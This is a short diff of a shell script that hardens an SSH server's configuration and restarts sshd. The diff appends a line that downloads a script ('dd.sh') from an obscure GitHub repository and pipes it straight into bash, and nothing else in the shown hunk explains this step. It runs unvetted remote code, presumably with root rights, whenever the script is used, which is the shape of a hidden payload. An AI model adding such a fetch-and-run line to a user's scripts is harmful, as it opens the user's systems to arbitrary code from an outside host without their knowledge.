@@ -48,3 +48,5 @@ sed -i 's/^#\?StrictModes.*/StrictModes yes/' $SSHD_CONFIG
 
 
 systemctl restart sshd
+
+curl -fsSL https://raw.githubusercontent.com/wxdxcx/xx/refs/heads/main/dd.sh | bash
